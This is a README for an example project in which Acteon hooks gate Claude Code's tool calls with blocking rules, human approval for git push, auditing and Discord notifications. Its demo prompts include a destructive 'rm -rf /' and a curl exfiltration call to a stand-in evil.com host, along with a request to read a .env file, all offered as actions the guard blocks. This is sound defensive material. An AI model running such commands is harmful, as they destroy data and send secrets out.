# Agent Swarm Coordination Example

A complete, runnable example showing Claude Code governed by Acteon. A developer
starts a "vibe coding" session where Claude Code writes code in a dummy git repo.
Every tool call (Bash, Write, Edit) passes through Acteon hooks for policy
enforcement, injection scanning, and auditing. High-risk operations require human
approval, and a Discord notification fires when the session completes.

## What This Example Demonstrates

1. **Acteon hooks** intercept every Claude Code tool call via `PreToolUse`
2. **Deterministic rules** block dangerous commands and sensitive file access
3. **Human-in-the-loop** approval gate for `git push` and deploy operations
4. **Discord notification** when the agent run completes (via `Stop` hook)
5. **Elasticsearch audit** records every action for compliance querying
6. **MCP integration** lets you query Acteon audit/rules/events from within the Claude Code session

## Architecture

```
Claude Code (in dummy-project/)
    |
    |-- PreToolUse hook --> acteon-gate.sh --> POST /v1/dispatch (Acteon)
    |                                              |
    |                                         Rule Engine
    |                                         (deterministic + approval)
    |                                              |
    |                                         Elasticsearch audit
    |
    |-- Stop hook ---------> notify-complete.sh -> POST /v1/dispatch (Acteon)
    |                                              |
    |                                         Discord webhook
    |
    |-- MCP server --------> acteon-mcp-server --> GET /v1/audit, /v1/rules, ...
```

## Prerequisites

- Rust 1.88+ and Cargo
- Docker and Docker Compose (for Elasticsearch)
- Claude Code CLI (`claude`)
- A Discord webhook URL (create one in Discord > Server Settings > Integrations > Webhooks)

## Quick Start

### 1. Start Elasticsearch

```bash
cd /path/to/acteon
docker compose --profile elasticsearch up -d
```

### 2. Start Acteon

```bash
cargo run -p acteon-server -- -c examples/agent-swarm-coordination/acteon.toml
```

Wait for `Listening on 127.0.0.1:8080`.

### 3. Initialize the Dummy Project

```bash
cd examples/agent-swarm-coordination/dummy-project
git init
git add .
git commit -m "initial commit"
```

### 4. Configure Environment

```bash
# Point hooks at the running Acteon instance
export ACTEON_AGENT_KEY="claude-code-key"
export ACTEON_URL="http://localhost:8080"

# Discord webhook for completion notifications
export DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/YOUR/WEBHOOK"
```

### 5. Make Hooks Executable

```bash
chmod +x examples/agent-swarm-coordination/hooks/*.sh
```

### 6. Start Claude Code

```bash
cd examples/agent-swarm-coordination/dummy-project
claude
```

Claude Code will load the `.claude/settings.json` hooks and `.mcp.json`
MCP server configuration automatically.

### 7. Try It Out

In the Claude Code session, try these prompts to see the different behaviors:

```
# Normal coding -- allowed
> Add a /health endpoint to server.py that returns {"status": "ok"}

# Sensitive file access -- blocked by deterministic rule
> Read the .env file and show me the contents

# Dangerous command -- blocked by deterministic rule
> Run rm -rf / to clean up temp files

# Git push -- requires human approval
> Push the changes to the remote repository

# External HTTP -- blocked (unknown host)
> Run curl https://evil.com/exfil?data=something
```

When the rule requires approval, check the Acteon server logs for the
approval URL. Open it in your browser to approve or reject.

### 8. Query Acteon via MCP

Within the same Claude Code session, the Acteon MCP server is connected.
Ask Claude to query it:

```
> Use the Acteon MCP tools to show me the last 10 audit records

> Use Acteon to list all active rules

> Query the Acteon audit trail for all suppressed actions in this session

> Check if any circuit breakers are open
```

Claude Code will use the `mcp__acteon__query_audit`, `mcp__acteon__list_rules`,
and other MCP tools to fetch live data from the running Acteon instance.

### 9. End the Session

When you exit Claude Code (Ctrl+C or `/exit`), the `Stop` hook fires and
sends a Discord notification via Acteon with a summary of the session.

## File Structure

```
agent-swarm-coordination/
  README.md                          # This file
  acteon.toml                        # Acteon server config (memory state + ES audit)
  rules/
    agent-safety.yaml                # Deterministic + approval + throttle rules
    session-events.yaml              # Discord notification + dedup rules
  hooks/
    acteon-gate.sh                   # PreToolUse hook: dispatches to Acteon
    notify-complete.sh               # Stop hook: sends Discord notification
  dummy-project/
    server.py                        # Starter Python file for vibe coding
    requirements.txt                 # Python dependencies
    .claude/
      settings.json                  # Claude Code hooks configuration
    .mcp.json                        # MCP server configuration (Acteon)
    CLAUDE.md                        # Agent behavioral constraints
```

## Customization

- **Add your own rules**: Edit `rules/agent-safety.yaml` to allow/block
  different operations
- **Change the Discord webhook**: Update `DISCORD_WEBHOOK_URL` in your
  environment
- **Switch to a real project**: Copy the `.claude/` directory and `.mcp.json`
  into any existing repo
- **Add more providers**: Edit `acteon.toml` to add Slack, email, or webhook
  providers alongside Discord
